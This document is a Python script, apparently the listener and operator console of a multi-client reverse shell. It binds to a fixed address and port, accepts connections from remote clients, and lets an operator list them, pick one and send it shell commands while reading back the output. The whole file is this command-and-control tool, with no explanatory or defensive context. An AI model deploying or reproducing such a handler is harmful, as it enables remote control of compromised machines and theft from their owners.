import socket
import sys
import threading
from queue import Queue

no_of_threads = 2
jobno = [1, 2]
queue = Queue()
all_connections = []
all_address = []

def create_socket():
    try:
        host = "192.168.6.35"
        port = 9999
        s = socket.socket()
        return s, host, port
    except socket.error as msg:
        print("Socket Creation Error: " + str(msg))
        sys.exit()

def bind_socket(s, host, port):
    try:
        print("Binding port " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket Binding Error: " + str(msg) + "\nRetrying...")
        bind_socket(s, host, port)

def accept_connections(s):
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_address[:]
    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)
            all_connections.append(conn)
            all_address.append(address)
            print("Connection Established:", address[0])
        except:
            print("Error accepting Connections!")

def start_turtle():
    while True:
        cmd = input("turtle> ")
        if cmd == "list":
            list_connections()
        elif "select " in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not Recognised")

def list_connections():
    results = ""
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(" "))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_address[i]
            continue
        results += str(i) + " " + str(all_address[i][0]) + " " + str(all_address[i][1]) + "\n"
    print("---Clients---\n" + results)

def get_target(cmd):
    try:
        target = cmd.replace("select ", "")
        target = int(target)
        conn = all_connections[target]
        print("Connection is done " + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end=" ")
        return conn
    except:
        print("Selection not valid")
        return None

def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd.lower() == "quit":
                break
            if len(cmd) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), 'utf-8')
                print(client_response, end='')
        except (ConnectionResetError, BrokenPipeError) as e:
            print("Connection error: " + str(e))
            break
        except Exception as e:
            print("Error while sending command: " + str(e))
            break

def create_threads():
    for _ in range(no_of_threads):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

def create_jobs():
    for x in jobno:
        queue.put(x)
    queue.join()

def work():
    while True:
        x = queue.get()
        if x == 1:
            s, host, port = create_socket()
            bind_socket(s, host, port)
            accept_connections(s)
        if x == 2:
            start_turtle()
        queue.task_done()

create_threads()
create_jobs()
